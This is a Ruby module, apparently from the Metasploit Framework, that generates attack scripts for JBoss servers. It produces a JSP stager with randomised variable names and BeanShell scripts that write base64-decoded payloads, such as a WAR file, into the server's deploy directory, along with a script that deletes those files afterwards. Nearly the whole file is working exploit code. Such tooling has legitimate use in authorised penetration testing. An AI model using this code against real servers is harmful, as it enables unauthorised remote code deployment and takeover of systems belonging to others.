# -*- coding: binary -*-
module Msf::HTTP::JBoss::BeanShellScripts

  def generate_bsh(type, opts ={})
    bean_shell = nil
    case type
    when :create
      bean_shell = create_file_bsh(opts)
    when :delete
      bean_shell = delete_files_bsh(opts)
    end

    bean_shell
  end

  # The following jsp script will write the exploded WAR file to the deploy/
  # directory. This is used to bypass the size limit for GET/HEAD requests
  # Dynamic variables, only used if we need a stager
  def stager_jsp(app_base)
    decoded_var = Rex::Text.rand_text_alpha(8+rand(8))
    file_path_var = Rex::Text.rand_text_alpha(8+rand(8))
    jboss_home_var = Rex::Text.rand_text_alpha(8+rand(8))
    fos_var = Rex::Text.rand_text_alpha(8+rand(8))
    content_var = Rex::Text.rand_text_alpha(8+rand(8))

    stager_jsp = <<-EOT
<%@page import="java.io.*,
    java.util.*,
    sun.misc.BASE64Decoder"
%>
<%
  String #{jboss_home_var} = System.getProperty("jboss.server.home.dir");
  String #{file_path_var} = #{jboss_home_var} + "/deploy/" + "#{app_base}.war";
  try {
    String #{content_var} = "";
    String parameterName = (String)(request.getParameterNames().nextElement());
    #{content_var} = request.getParameter(parameterName);
    FileOutputStream #{fos_var} = new FileOutputStream(#{file_path_var});
    byte[] #{decoded_var} = new BASE64Decoder().decodeBuffer(#{content_var});
    #{fos_var}.write(#{decoded_var});
    #{fos_var}.close();
  }
  catch(Exception e){ }
%>
    EOT

    stager_jsp
  end

  def create_file_bsh(opts = {})
    dir = opts[:dir]
    file = opts[:file]
    contents = opts[:contents]

    payload_bsh_script = <<-EOT
import java.io.FileOutputStream;
import sun.misc.BASE64Decoder;

String val = "#{contents}";

BASE64Decoder decoder = new BASE64Decoder();
String jboss_home = System.getProperty("jboss.server.home.dir");
new File(jboss_home + "/deploy/#{dir}").mkdir();
byte[] byteval = decoder.decodeBuffer(val);
String location = jboss_home + "/deploy/#{file}";
FileOutputStream fstream = new FileOutputStream(location);
fstream.write(byteval);
fstream.close();
    EOT

    vprint_status("Creating deploy/#{file} via BSHDeployer")
    payload_bsh_script
  end

  def delete_files_bsh(opts = {})
    script = "String jboss_home = System.getProperty(\"jboss.server.home.dir\");\n"
    opts.values.each do |v|
      script << "new File(jboss_home + \"/deploy/#{v}\").delete();\n"
    end

    script
  end
end
